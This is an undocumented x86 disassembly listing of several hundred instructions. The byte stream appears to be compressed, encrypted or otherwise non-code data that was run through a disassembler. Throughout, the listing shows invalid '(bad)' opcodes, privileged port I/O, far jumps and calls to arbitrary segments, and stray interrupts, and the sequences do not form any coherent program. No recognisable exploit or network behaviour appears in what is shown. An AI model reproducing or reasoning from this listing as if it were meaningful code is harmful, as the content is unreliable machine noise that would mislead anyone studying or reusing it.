  4238d8:	mov    ebx,0xe230d532
  4238dd:	pop    es
  4238de:	and    DWORD PTR [ecx],ecx
  4238e0:	xchg   ebx,eax
  4238e1:	aam    0xa7
  4238e3:	xchg   esi,eax
  4238e4:	dec    ebx
  4238e5:	lahf   
  4238e6:	mov    eax,ds:0xcd6be568
  4238eb:	loope  0x423881
  4238ed:	stos   DWORD PTR es:[edi],eax
  4238ee:	sbb    eax,DWORD PTR [esi-0x6eac2527]
  4238f4:	lahf   
  4238f5:	pop    ss
  4238f6:	inc    ebx
  4238f7:	mov    eax,0xe6d59470
  4238fc:	imul   eax,edx,0xcb863ca3
  423902:	mov    eax,0x9099536f
  423907:	(bad)  
  423908:	gs jne 0x4238a5
  42390b:	in     al,dx
  42390c:	push   0xe1f6fcd6
	...
  423971:	add    BYTE PTR [eax],al
  423973:	add    BYTE PTR [edx-0x770e5c],cl
  423979:	(bad)  
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0xd9162bbd
  423982:	pop    es
  423983:	aad    0x1f
  423985:	jl     0x423988
  423987:	add    BYTE PTR ds:0x59000001,al
  42398d:	repz int3 
  42398f:	sub    al,0x24
  423991:	pusha  
  423992:	cmp    DWORD PTR [ecx+esi*8+0x714d8381],esp
  423999:	enter  0x8ffd,0x2a
  42399d:	add    al,0xe0
  42399f:	mov    cl,ch
  4239a1:	push   es
  4239a2:	retf   0xd53b
  4239a5:	mov    ecx,0x8ade8826
  4239aa:	cmp    al,0x37
  4239ac:	push   esp
  4239ad:	xor    eax,DWORD PTR [eax]
  4239af:	loope  0x4239da
  4239b1:	stc    
  4239b2:	fstp   TBYTE PTR [ebp+0x5901897c]
  4239b8:	test   al,0xaa
  4239ba:	out    0xd,al
  4239bc:	xor    al,0x73
  4239be:	push   ebx
  4239bf:	dec    ecx
  4239c0:	push   ebp
  4239c1:	stc    
  4239c2:	scas   eax,DWORD PTR es:[edi]
  4239c3:	fisttp DWORD PTR ds:0x82bf1b96
  4239c9:	jp     0x423a46
  4239cb:	popa   
  4239cc:	cld    
  4239cd:	imul   ecx,DWORD PTR [esi-0x28],0xffffffe8
  4239d1:	retf   0x40b9
  4239d4:	push   ebp
  4239d5:	cmp    BYTE PTR [ebx],0x48
  4239d8:	popf   
  4239d9:	xor    BYTE PTR [edx+0x1d0a6d54],dh
  4239df:	pop    ds
  4239e0:	cmp    bh,bl
  4239e2:	jmp    edx
  4239e4:	aad    0x3b
  4239e6:	mov    al,0x57
  4239e8:	mov    DWORD PTR [edi-0x1d],ebp
  4239eb:	add    eax,0xa07dac83
  4239f0:	fld    TBYTE PTR [ebx-0x4ebd7a7d]
  4239f6:	push   edi
  4239f7:	add    eax,0x2091e145
  4239fc:	or     eax,0xdc3126bb
  423a01:	xlat   BYTE PTR ds:[ebx]
  423a02:	inc    BYTE PTR [esi+eax*2-0x3f]
  423a06:	in     al,0xeb
  423a08:	fisubr DWORD PTR [edi+0x2d]
  423a0b:	loopne 0x4239c8
  423a0d:	pop    ecx
  423a0e:	push   ebp
  423a0f:	stos   DWORD PTR es:[edi],eax
  423a10:	shl    DWORD PTR [edx],0x47
  423a13:	xor    dh,BYTE PTR [edi+0x2d]
  423a16:	mov    ecx,0x84068b8
  423a1b:	inc    eax
  423a1c:	lea    edx,[ebx-0x78]
  423a1f:	mov    bh,BYTE PTR [ecx-0x3d]
  423a22:	retf   0xcb38
  423a25:	dec    ebp
  423a26:	hlt    
  423a27:	mov    dl,0xe8
  423a29:	sub    DWORD PTR [edi+0x2d],ecx
  423a2c:	cmp    eax,0x83caf332
  423a31:	(bad)  
  423a32:	(bad)  
  423a34:	cmp    BYTE PTR ss:[ecx],0x12
  423a38:	mov    esi,0x15fc2488
  423a3d:	std    
  423a3e:	fldcw  WORD PTR [edx+0x7eb967c0]
  423a44:	adc    eax,0x6be62bd0
  423a49:	pop    ss
  423a4a:	outs   dx,BYTE PTR ds:[esi]
  423a4b:	cwde   
  423a4c:	dec    ebp
  423a4d:	xchg   edi,eax
  423a4e:	push   edx
  423a4f:	adc    DWORD PTR [edx-0x1d],ecx
  423a52:	int    0xa2
  423a54:	pop    ebx
  423a55:	retf   0x5f58
  423a58:	lea    edi,[edi]
  423a5a:	int3   
  423a5b:	xchg   ebx,eax
  423a5c:	jp     0x423a12
  423a5e:	dec    esi
  423a5f:	xchg   edi,eax
  423a60:	dec    edx
  423a61:	std    
  423a62:	jg     0x423a03
  423a64:	and    BYTE PTR ds:0x9718a220,dh
  423a6a:	push   0xc3bb81c5
  423a6f:	mov    ecx,0x5a72d7cf
  423a74:	mov    ah,BYTE PTR [edx+0x530671be]
  423a7a:	inc    esp
  423a7b:	and    bh,BYTE PTR [eax-0x1910bdd4]
  423a81:	cmp    edx,eax
  423a83:	mov    ebx,0x28f4120
  423a88:	mov    cl,0xb3
  423a8a:	scas   eax,DWORD PTR es:[edi]
  423a8b:	stos   BYTE PTR es:[edi],al
  423a8c:	cmp    ch,BYTE PTR [ebx+0xa27a97]
	...
  423af2:	add    BYTE PTR [eax],al
  423af4:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	call   0x248f029b
  423b05:	jge    0x423b08
  423b07:	add    BYTE PTR ds:0x10000001,al
  423b0d:	mov    ecx,0x654e735f
  423b12:	test   DWORD PTR [edx-0x25],0xdd82d52d
  423b19:	push   cs
  423b1a:	out    0xe8,al
  423b1c:	add    edx,edi
  423b1e:	fist   DWORD PTR [ecx]
  423b20:	fmul   DWORD PTR [esi-0x51]
  423b23:	cmp    dh,al
  423b25:	jmp    0xe4cf:0x499096b8
  423b2c:	inc    eax
  423b2d:	xchg   DWORD PTR [ecx+ecx*1],esp
  423b30:	mov    bh,0xdd
  423b32:	inc    ecx
  423b33:	dec    esi
  423b34:	in     al,dx
  423b35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b36:	scas   eax,DWORD PTR es:[edi]
  423b37:	sub    ch,BYTE PTR [edi+0x66]
  423b3a:	push   cs
  423b3b:	adc    edi,DWORD PTR [ecx-0x75]
  423b3e:	sbb    BYTE PTR [edx-0x5f],al
  423b41:	sub    edx,DWORD PTR [eax+0x36]
  423b44:	add    BYTE PTR [ebx],dh
  423b46:	jg     0x423b72
  423b48:	shr    DWORD PTR [ecx+0x77892d3f],cl
  423b4e:	scas   eax,DWORD PTR es:[edi]
  423b4f:	fistp  QWORD PTR [edx-0x7dba81b2]
  423b55:	push   ss
  423b56:	mov    ds:0x2b69c2ea,al
  423b5b:	sar    DWORD PTR [ecx],1
  423b5d:	mov    ecx,0xe54c27b2
  423b62:	retf   
  423b63:	fs dec ebx
  423b65:	je     0x423b21
  423b67:	rol    DWORD PTR [esi],0x91
  423b6a:	mov    dh,0x74
  423b6c:	in     eax,dx
  423b6d:	cmp    DWORD PTR [edi],0xffffff85
  423b70:	xor    dh,BYTE PTR [edx+0x35]
  423b73:	out    0xeb,al
  423b75:	outs   dx,BYTE PTR ds:[esi]
  423b76:	arpl   WORD PTR [eax],ax
  423b78:	add    al,0x18
  423b7a:	cli    
  423b7b:	es push cs
  423b7d:	pop    esp
  423b7e:	mov    ch,al
  423b80:	sub    eax,0x82d73573
  423b85:	or     eax,DWORD PTR [ebp-0x680d1bf6]
  423b8b:	or     al,0x61
  423b8d:	jns    0x423b5e
  423b8f:	inc    esi
  423b90:	addr16 xor eax,0x1062d8c5
  423b96:	imul   esi,DWORD PTR [ebp+0x34889af2],0x44
  423b9d:	bnd jne 0x423b5a
  423ba0:	in     al,dx
  423ba1:	shl    cl,cl
  423ba3:	test   eax,0xe84a1411
  423ba8:	(bad)  
  423ba9:	(bad)  
  423baa:	adc    eax,0x4ecfb77b
  423baf:	add    BYTE PTR [ebx+0x3ff78d3],dl
  423bb5:	or     edi,esi
  423bb7:	or     eax,0x75e50a0c
  423bbc:	sbb    DWORD PTR [edx+0x72726927],ebx
  423bc2:	add    esp,DWORD PTR [ecx]
  423bc4:	cmp    dl,BYTE PTR [ecx-0x3cb7f75c]
  423bca:	add    DWORD PTR [ebx-0x1f19a09a],ebp
  423bd0:	fdiv   DWORD PTR [ecx]
  423bd2:	pop    ds
  423bd3:	rcl    ecx,0xdc
  423bd6:	cs nop
  423bd8:	(bad)  
  423bd9:	push   edx
  423bda:	or     eax,0x1646d840
  423bdf:	push   es
  423be0:	xor    bl,BYTE PTR [ecx-0x50]
  423be3:	fist   WORD PTR [ecx+0x4]
  423be6:	cs rcr al,1
  423be9:	dec    eax
  423bea:	xchg   esp,eax
  423beb:	aam    0x1
  423bed:	lea    ebx,[ecx]
  423bef:	(bad)  
  423bf0:	imul   edi,DWORD PTR [eax-0x9],0x83a9c800
  423bf7:	push   ecx
  423bf8:	xchg   edi,eax
  423bf9:	mov    bh,0xf3
  423bfb:	call   0xc851c491
  423c00:	sbb    ebx,edi
  423c02:	push   ebx
  423c03:	popf   
  423c04:	test   DWORD PTR [ebx+0x42],esi
  423c07:	xchg   ecx,eax
  423c08:	scas   eax,DWORD PTR es:[edi]
  423c09:	mov    esp,0x73b34f9b
  423c0e:	add    dh,BYTE PTR [ebp+0x5]
	...
  423c71:	add    BYTE PTR [eax],al
  423c73:	add    ch,bh
  423c75:	(bad)  
  423c76:	test   eax,0xff57ab46
  423c7b:	call   FWORD PTR [eax+0x61446617]
  423c81:	jmp    0x7e6c0139
  423c86:	add    DWORD PTR [eax],eax
  423c88:	add    eax,0xf6000001
  423c8d:	lock jno 0x423c24
  423c90:	cmp    bl,dl
  423c92:	cmp    edi,DWORD PTR [ebp-0x32]
  423c95:	repz push ds
  423c97:	pop    ebp
  423c98:	inc    edi
  423c99:	push   ebp
  423c9a:	push   es
  423c9b:	retf   0x8dc9
  423c9e:	xor    BYTE PTR [esi+0x71],dh
  423ca1:	xchg   esp,eax
  423ca2:	loop   0x423cca
  423ca4:	push   ds
  423ca5:	pop    ss
  423ca6:	inc    esi
  423ca7:	in     eax,0x28
  423ca9:	mov    bh,0x51
  423cab:	or     eax,0x338ac59c
  423cb0:	jge    0x423cb9
  423cb2:	xor    al,0xec
  423cb4:	push   ds
  423cb5:	rcr    BYTE PTR [edx],cl
  423cb7:	mov    edx,0xaeb89f19
  423cbc:	enter  0x8f9,0x5e
  423cc0:	and    BYTE PTR [edi+0x4b],bh
  423cc3:	or     ebp,edx
  423cc5:	jecxz  0x423ca9
  423cc7:	xor    bh,BYTE PTR [edx+0x1d]
  423cca:	ret    
  423ccb:	push   ebx
  423ccc:	enter  0x9294,0x61
  423cd0:	xor    cl,BYTE PTR [eax+0x97fe316]
  423cd6:	jle    0x423cc5
  423cd8:	or     DWORD PTR [eax],ebx
  423cda:	jnp    0x423c88
  423cdc:	dec    esi
  423cdd:	aaa    
  423cde:	mov    cl,0xdf
  423ce0:	shl    DWORD PTR [esp+edi*8],0x7c
  423ce4:	lea    esi,[ebx]
  423ce6:	outs   dx,BYTE PTR ds:[esi]
  423ce7:	out    dx,eax
  423ce8:	loopne 0x423d2f
  423cea:	xchg   ebp,eax
  423ceb:	xchg   ebp,eax
  423cec:	js     0x423d27
  423cee:	imul   edi,DWORD PTR [ecx+0x39],0xffffffd6
  423cf2:	xchg   DWORD PTR [ecx-0xa],ebp
  423cf5:	int3   
  423cf6:	adc    DWORD PTR [eax],eax
  423cf8:	push   ebp
  423cf9:	(bad)  
  423cfa:	sti    
  423cfb:	xchg   ecx,eax
  423cfc:	inc    ecx
  423cfd:	test   eax,0x42d11d9e
  423d02:	hlt    
  423d03:	jnp    0x423d56
  423d05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423d06:	repnz fistp QWORD PTR [esi+0x5b]
  423d0a:	loopne 0x423cda
  423d0c:	je     0x423d03
  423d0e:	sbb    DWORD PTR [ecx+0x575987da],ebp
  423d14:	int3   
  423d15:	add    al,0x61
  423d17:	inc    esp
  423d18:	stos   BYTE PTR es:[edi],al
  423d19:	jp     0x423caa
  423d1b:	jmp    0xd12075c
  423d20:	xor    BYTE PTR [esi-0x2a],ch
  423d23:	loope  0x423d50
  423d25:	sbb    ch,BYTE PTR ds:0x1cfdb5e5
  423d2b:	or     BYTE PTR [esi+ecx*1+0x55142f8d],bh
  423d32:	pop    esi
  423d33:	cs (bad) 
  423d35:	fist   DWORD PTR [ebx-0x6fe941ae]
  423d3b:	aad    0x2c
  423d3d:	jns    0x423d1e
  423d3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d40:	inc    eax
  423d41:	sahf   
  423d42:	fstp   TBYTE PTR [eax-0x5f]
  423d45:	adc    al,0x98
  423d47:	cmp    BYTE PTR [edi+ebx*2-0x29],0x52
  423d4c:	outs   dx,DWORD PTR ds:[esi]
  423d4d:	jmp    0x423dbd
  423d4f:	adc    BYTE PTR [edi],ch
  423d51:	sub    cl,BYTE PTR [eax-0x71]
  423d54:	inc    esp
  423d55:	sub    bl,BYTE PTR [ecx+ecx*2]
  423d58:	or     ebp,ebx
  423d5a:	(bad)  
  423d5b:	aad    0x36
  423d5d:	adc    BYTE PTR [edi+ebp*8+0x76eab941],bh
  423d64:	mov    bl,0xee
  423d66:	cmp    esi,DWORD PTR [esi+0x19]
  423d69:	mov    bl,0x8d
  423d6b:	test   eax,0x57896da4
  423d70:	mov    ecx,0x827980b
  423d75:	inc    esi
  423d76:	jmp    0x495da33c
  423d7b:	aaa    
  423d7c:	ud0    eax,DWORD PTR [ebp-0x5d]
  423d80:	call   0x477e:0x1c7ea17c
  423d87:	pop    edi
  423d88:	xor    eax,0xbd9ca92b
  423d8d:	sbb    ebx,DWORD PTR [edi]
  423d8f:	jmp    0x423d4d
	...
  423df1:	add    BYTE PTR [eax],al
  423df3:	add    BYTE PTR [edx-0xa],ah
  423df6:	xchg   DWORD PTR [ecx],ecx
  423df8:	xchg   edi,eax
  423df9:	jns    0x423de9
  423dfb:	jmp    DWORD PTR [edi]
  423dfd:	mov    DWORD PTR [eax+0x4a6181d2],esp
  423e03:	xor    ch,BYTE PTR [esi]
  423e05:	jg     0x423e08
  423e07:	add    BYTE PTR ds:0xe0000001,al
  423e0d:	jo     0x423e06
  423e0f:	xchg   ecx,eax
  423e10:	mov    edx,edi
  423e12:	pop    ebx
  423e13:	mov    ds:0xfec05188,eax
  423e18:	loope  0x423df9
  423e1a:	ja     0x423e81
  423e1c:	shl    DWORD PTR [ecx+0x3d],1
  423e1f:	les    ecx,FWORD PTR [edi]
  423e21:	call   0xd1b89021
  423e26:	out    0x5d,eax
  423e28:	mov    dl,0x90
  423e2a:	in     eax,0x6e
  423e2c:	push   ecx
  423e2d:	cmp    al,0x9b
  423e2f:	out    0xc3,al
  423e31:	xor    al,0xda
  423e33:	(bad)  
  423e34:	sub    eax,0x7c31d8d7
  423e39:	out    dx,eax
  423e3a:	pop    ebx
  423e3b:	dec    esp
  423e3c:	jb     0x423e57
  423e3e:	daa    
  423e3f:	sub    edx,DWORD PTR [eax+0x2a3b8f8]
  423e45:	nop
  423e46:	hlt    
  423e47:	mov    al,ds:0x863ee3b4
  423e4c:	stos   DWORD PTR es:[edi],eax
  423e4d:	cmp    ebp,0x9d0e17b1
  423e53:	cwde   
  423e54:	adc    eax,0x5433ac89
  423e59:	lds    ebx,FWORD PTR [ebx+ebp*2]
  423e5c:	das    
  423e5d:	push   0x214360a4
  423e62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423e63:	add    BYTE PTR [ebx-0x7d],dh
  423e66:	pop    esi
  423e67:	add    al,0x44
  423e69:	rcr    DWORD PTR [ebx+0x69c313b4],cl
  423e6f:	fwait
  423e70:	xor    ecx,DWORD PTR [edx+0x48]
  423e73:	add    DWORD PTR [ecx],esi
  423e75:	out    0xc,al
  423e77:	adc    ebx,eax
  423e79:	sbb    al,0xc0
  423e7b:	(bad)  
  423e7c:	push   cs
  423e7d:	pop    ss
  423e7e:	in     al,0x17
  423e80:	cld    
  423e81:	ja     0x423ec7
  423e83:	in     eax,0xbe
  423e85:	xor    ch,ah
  423e87:	sub    BYTE PTR [ebp+0x12],0xde
  423e8b:	jge    0x423e9a
  423e8d:	mov    esp,edx
  423e8f:	pushf  
  423e90:	sbb    eax,0x194e15f7
  423e95:	(bad)  
  423e96:	mov    eax,0x8e52739a
  423e9b:	dec    esi
  423e9c:	mov    WORD PTR [edi],es
  423e9e:	jb     0x423f17
  423ea0:	sub    edi,DWORD PTR [ecx+0x68]
  423ea3:	push   ss
  423ea4:	clc    
  423ea5:	or     esi,DWORD PTR [ebx]
  423ea7:	mov    BYTE PTR [edi+0x54c728b7],ah
  423ead:	das    
  423eae:	les    ecx,FWORD PTR [edi-0x76]
  423eb1:	ret    0x64c8
  423eb4:	mov    dx,0x1d62
  423eb8:	lock fmul DWORD PTR [ebp-0x69eb6998]
  423ebf:	pop    esi
  423ec0:	add    BYTE PTR [ebp+0x70101424],0xb6
  423ec7:	xchg   edi,eax
  423ec8:	jmp    0x6a0004cd
  423ecd:	cli    
  423ece:	push   esi
  423ecf:	shr    BYTE PTR [edi],0x1d
  423ed2:	scas   eax,DWORD PTR es:[edi]
  423ed3:	sbb    DWORD PTR [esi+esi*8],esi
  423ed6:	in     eax,0xb5
  423ed8:	imul   ebp,DWORD PTR [ebx+0x36],0x50
  423edc:	inc    ecx
  423edd:	ret    0x29a
  423ee0:	out    0x36,al
  423ee2:	les    esi,FWORD PTR [ecx+0xbbe469]
  423ee8:	ins    BYTE PTR es:[edi],dx
  423ee9:	lahf   
  423eea:	ret    
  423eeb:	ret    
  423eec:	push   esp
  423eed:	or     al,0x33
  423eef:	and    ecx,DWORD PTR [edx]
  423ef1:	stos   BYTE PTR es:[edi],al
  423ef2:	pop    ebx
  423ef3:	loopne 0x423f08
  423ef5:	ds add eax,0xaca88225
  423efb:	bound  ebx,QWORD PTR [ebp+0x61575c3c]
  423f01:	lods   al,BYTE PTR ds:[esi]
  423f02:	adc    cl,BYTE PTR [eax+eax*1]
  423f05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423f06:	fs cmc 
  423f08:	cdq    
  423f09:	lods   eax,DWORD PTR ds:[esi]
  423f0a:	outs   dx,BYTE PTR ds:[esi]
  423f0b:	pop    edi
  423f0c:	in     al,0x43
  423f0e:	push   cs
  423f0f:	cmc    
  423f10:	push   ss
	...
  423f71:	add    BYTE PTR [eax],al
  423f73:	add    BYTE PTR [esi+0x74b9649a],ch
  423f79:	(bad)  
  423f7a:	call   FWORD PTR [edi-0x26e369ec]
  423f80:	fimul  DWORD PTR [ecx-0x33]
  423f83:	mov    ecx,0x18033
  423f88:	add    eax,0xe7000001
  423f8d:	pop    es
  423f8e:	push   0x4cab9bb
  423f93:	lods   al,BYTE PTR ds:[esi]
  423f94:	xlat   BYTE PTR ds:[ebx]
  423f95:	sbb    BYTE PTR [ebp-0x2b],dl
  423f98:	dec    ebx
  423f99:	out    0x9c,al
  423f9b:	pop    esi
  423f9c:	inc    edx
  423f9d:	xchg   edi,eax
  423f9e:	xchg   ecx,eax
  423f9f:	xor    ebx,edi
  423fa1:	outs   dx,DWORD PTR ds:[esi]
  423fa2:	jmp    0x423fca
  423fa4:	into   
  423fa5:	mov    edi,0x1e08f12
  423faa:	mov    al,ds:0xb042e88
  423faf:	mov    BYTE PTR [edi],al
  423fb1:	int3   
  423fb2:	stc    
  423fb3:	fdiv   QWORD PTR [edx-0x125b753b]
  423fb9:	(bad)  
  423fba:	outs   dx,BYTE PTR ds:[esi]
  423fbb:	push   edx
  423fbc:	jle    0x423f63
  423fbe:	push   ecx
  423fbf:	cmp    al,0xae
  423fc1:	mov    bl,0x5d
  423fc3:	cdq    
  423fc4:	ss and eax,0xe63bdf57
  423fca:	test   eax,0x22b672
  423fcf:	fsub   st(7),st
  423fd1:	mov    esi,0xb12a4b93
  423fd6:	and    al,0xa1
  423fd8:	test   eax,0x214b5e0a
  423fdd:	imul   edx,esi,0x52
  423fe0:	dec    eax
  423fe1:	in     al,dx
  423fe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423fe3:	das    
  423fe4:	outs   dx,BYTE PTR ds:[esi]
  423fe5:	out    0x25,al
  423fe7:	push   esp
  423fe8:	fbld   TBYTE PTR [edx]
  423fea:	sub    ebx,DWORD PTR [ebx]
  423fec:	and    BYTE PTR [edx+0x46d0eac7],dh
  423ff2:	mov    ch,0x8f
  423ff4:	rcl    DWORD PTR [esi+0x42],cl
  423ff7:	jmp    0x423f95
  423ff9:	xor    dl,bl
  423ffb:	add    dh,BYTE PTR [esi+eiz*8-0x52a768c0]
  424002:	mov    bl,0x79
  424004:	and    dh,dl
  424006:	mov    DWORD PTR [esi+0x18],esi
  424009:	pushf  
  42400a:	or     ebx,edx
  42400c:	lods   eax,DWORD PTR ds:[esi]
  42400d:	aas    
  42400e:	(bad)
  424011:	fst    DWORD PTR [edi+0x27]
  424014:	jmp    0xaeaaa71d
  424019:	pop    esi
  42401a:	repnz or dh,ch
  42401d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42401e:	js     0x42409b
  424020:	xor    DWORD PTR [eax+0x15],0x77
  424024:	sub    edi,edx
  424026:	test   DWORD PTR [edi],esp
  424028:	mov    eax,ds:0x7cc29e68
  42402d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42402e:	cmp    ebx,ebx
  424030:	sub    edi,DWORD PTR [eax+0x40]
  424033:	mov    bl,BYTE PTR [ebp+0x65]
  424036:	mov    ah,0x98
  424038:	cmp    al,0x3c
  42403a:	dec    esi
  42403b:	out    dx,al
  42403c:	gs inc ebp
  42403e:	push   es
  42403f:	fwait
  424040:	out    dx,eax
  424041:	out    0x53,eax
  424043:	popf   
  424044:	push   ss
  424045:	cmp    dl,BYTE PTR [esi+0x1d]
  424048:	dec    edx
  424049:	jmp    0x4a20:0xa3067c38
  424050:	cld    
  424051:	lds    ebx,FWORD PTR [edi-0x257b40df]
  424057:	leave  
  424058:	aaa    
  424059:	mov    eax,0x538370d3
  42405e:	jmp    0xf44a95c9
  424063:	into   
  424064:	jno    0x424032
  424066:	cmp    BYTE PTR [ebx],dh
  424068:	push   ecx
  424069:	(bad)  
  42406a:	loop   0x4240d1
  42406c:	int    0xca
  42406e:	or     eax,0x6055e5ab
  424073:	inc    edi
  424074:	push   esi
  424075:	mov    ?,WORD PTR [ebp-0x5b]
  424078:	pop    edx
  424079:	sbb    DWORD PTR [edi],ebp
  42407b:	ficomp DWORD PTR [esi-0x42224d8f]
  424081:	addr16 sub esp,0x36
  424085:	stos   BYTE PTR es:[edi],al
  424086:	push   ss
  424087:	pop    ecx
  424088:	loopne 0x424104
  42408a:	mov    ah,BYTE PTR [edi+ebp*2+0x64b0e5cb]
	...
  4240f1:	add    BYTE PTR [eax],al
  4240f3:	add    BYTE PTR [eax+ebx*2+0x2e],bh
  4240f7:	mov    cl,0x2e
  4240f9:	idiv   edi
  4240fb:	(bad)  
  4240fd:	jne    0x4240c6
  4240ff:	iret   
  424100:	sub    edi,DWORD PTR [eax-0x6f]
  424103:	xchg   edx,eax
  424104:	cmp    BYTE PTR [ecx+0x1050001],al
  42410a:	add    BYTE PTR [eax],al
  42410c:	mov    cl,0x46
  42410e:	test   DWORD PTR [edi-0x51],ebx
  424111:	stos   DWORD PTR es:[edi],eax
  424112:	jnp    0x42416d
  424114:	mov    bh,0x6c
  424116:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424117:	xchg   ebp,eax
  424118:	or     dh,ah
  42411a:	loopne 0x4240f0
  42411c:	and    BYTE PTR [edx-0x22a1088b],cl
  424122:	mov    ds:0xc0d481db,eax
  424127:	xchg   esp,eax
  424128:	adc    edx,DWORD PTR [edi+0x325fddcc]
  42412e:	xor    ebp,DWORD PTR [ebx]
  424130:	inc    ecx
  424131:	(bad)  
  424132:	fwait
  424133:	sub    dl,BYTE PTR [ecx]
  424135:	adc    BYTE PTR [edx+0x1],0xce
  424139:	xor    BYTE PTR [edx],0xa8
  42413c:	ret    
  42413d:	pushf  
  42413e:	xchg   esp,eax
  42413f:	call   0x8ad5:0xd5bcf4e4
  424146:	mov    ebp,0x50fb445f
  42414b:	sub    esi,DWORD PTR [ecx+0x11]
  42414e:	inc    ecx
  42414f:	jbe    0x42414d
  424151:	dec    edi
  424152:	push   esi
  424153:	int3   
  424154:	(bad)  [edx]
  424156:	fild   QWORD PTR [eax-0x64]
  424159:	jne    0x4241b6
  42415b:	inc    edx
  42415c:	int    0x29
  42415e:	daa    
  42415f:	jmp    0x4241cb
  424161:	ret    0x7f0a
  424164:	add    al,0x8
  424166:	mov    esi,DWORD PTR [edx+0x2509752e]
  42416c:	out    dx,al
  42416d:	cmp    eax,ecx
  42416f:	popa   
  424170:	jge    0x424176
  424172:	in     al,dx
  424173:	inc    ebx
  424174:	jg     0x424129
  424176:	out    0x6e,eax
  424178:	lea    ebx,[ecx+0x7]
  42417b:	add    BYTE PTR [ecx-0x3b69c6d8],cl
  424181:	sub    al,0x6d
  424183:	arpl   WORD PTR [ebp+0x2e],sp
  424186:	out    0x2a,eax
  424188:	cwde   
  424189:	nop
  42418a:	das    
  42418b:	out    0x8d,al
  42418d:	gs gs fdivr st,st(3)
  424191:	mov    edi,0x38b3d93f
  424196:	pop    edx
  424197:	ror    BYTE PTR [ebp+0xb01f19a],0x44
  42419e:	scas   eax,DWORD PTR es:[edi]
  42419f:	push   esi
  4241a0:	sbb    bh,BYTE PTR [ebx+0x2]
  4241a3:	(bad)  
  4241a4:	(bad)
  4241a7:	xor    ebp,DWORD PTR [eax]
  4241a9:	inc    ebx
  4241aa:	pop    ebx
  4241ab:	cmp    BYTE PTR [esi-0x2552044f],dh
  4241b1:	mov    al,dh
  4241b3:	dec    esi
  4241b4:	js     0x4241f8
  4241b6:	add    esi,DWORD PTR [edi]
  4241b8:	pop    ss
  4241b9:	cmp    BYTE PTR [edx],dh
  4241bb:	pop    es
  4241bc:	push   ds
  4241bd:	cmp    DWORD PTR [edx],esi
  4241bf:	mov    edi,0xd9b4c048
  4241c4:	adc    BYTE PTR ds:0x215fc351,bl
  4241ca:	add    al,0x2e
  4241cc:	and    eax,0xa271366d
  4241d1:	aad    0xed
  4241d3:	stos   BYTE PTR es:[edi],al
  4241d4:	psubsb mm1,mm6
  4241d7:	or     esi,edi
  4241d9:	sbb    edi,ebx
  4241db:	fstp   QWORD PTR [ecx+0x6c]
  4241de:	js     0x424174
  4241e0:	xor    ah,dh
  4241e2:	sub    BYTE PTR [esi+ecx*1-0x5],cl
  4241e6:	stos   DWORD PTR es:[edi],eax
  4241e7:	push   esp
  4241e8:	fidiv  DWORD PTR [edx+0x3d]
  4241eb:	add    DWORD PTR [ebp-0x3a],edx
  4241ee:	in     eax,0x71
  4241f0:	rcl    DWORD PTR [esi+0x5],1
  4241f3:	add    eax,0xce85bfa6
  4241f8:	call   0x37029a6e
  4241fd:	mov    cl,0xae
  4241ff:	out    0x2f,al
  424201:	cmp    al,0x14
  424203:	mov    DWORD PTR [ebx+0x15],edx
  424206:	test   al,0xfb
  424208:	cdq    
  424209:	sti    
  42420a:	inc    eax
  42420b:	mov    dl,0x2e
  42420d:	into   
  42420e:	fbld   TBYTE PTR ds:0x5a
	...
  424274:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	inc    esp
  424281:	jecxz  0x4242b8
  424283:	sbb    edi,DWORD PTR ds:0x5000182
  424289:	add    DWORD PTR [eax],eax
  42428b:	add    BYTE PTR [esi],bh
  42428d:	jo     0x424219
  42428f:	pop    ss
  424290:	ss repnz icebp 
  424293:	jbe    0x424267
  424295:	jecxz  0x4242ff
  424297:	std    
  424298:	add    cl,dh
  42429a:	enter  0xe25c,0x65
  42429e:	jl     0x42427e
  4242a0:	xor    ch,BYTE PTR [edx+ecx*8]
  4242a3:	inc    esi
  4242a4:	xor    esi,DWORD PTR [esi+ebx*2-0x36812788]
  4242ab:	ret    
  4242ac:	ja     0x42424f
  4242ae:	fisub  WORD PTR [eax+ebx*4-0x476b0ec6]
  4242b5:	and    DWORD PTR [esp+0x5b817014],ebp
  4242bc:	xlat   BYTE PTR ds:[ebx]
  4242bd:	jnp    0x424308
  4242bf:	jmp    0x4242e6
  4242c1:	sbb    bl,BYTE PTR [ebx+0x41]
  4242c4:	in     al,0x5f
  4242c6:	cmp    DWORD PTR [ecx+edi*4-0x78ba862e],edi
  4242cd:	push   edx
  4242ce:	outs   dx,BYTE PTR ds:[esi]
  4242cf:	sar    DWORD PTR [eax-0x31123c5],cl
  4242d5:	lock fmul QWORD PTR [edi+0x35]
  4242d9:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4242dc:	inc    edi
  4242dd:	clc    
  4242de:	out    dx,eax
  4242df:	jmp    0x424358
  4242e1:	jnp    0x42429a
  4242e3:	adc    ecx,ebp
  4242e5:	ins    DWORD PTR es:[edi],dx
  4242e6:	cli    
  4242e7:	xchg   edx,eax
  4242e8:	aad    0x2a
  4242ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4242eb:	or     eax,esp
  4242ed:	push   edx
  4242ee:	test   ah,dh
  4242f0:	clc    
  4242f1:	mov    ecx,0x5bcb81eb
  4242f6:	aaa    
  4242f7:	loopne 0x424335
  4242f9:	push   0x1eec901c
  4242fe:	ds int 0x93
  424301:	mov    dh,BYTE PTR [eax-0x4e]
  424304:	mov    ebx,0x5d8187dc
  424309:	addr16 (bad) 
  42430b:	cmp    edi,DWORD PTR [edx+0x7b215546]
  424311:	pushf  
  424312:	jge    0x424377
  424314:	repz jae 0x424352
  424317:	je     0x424320
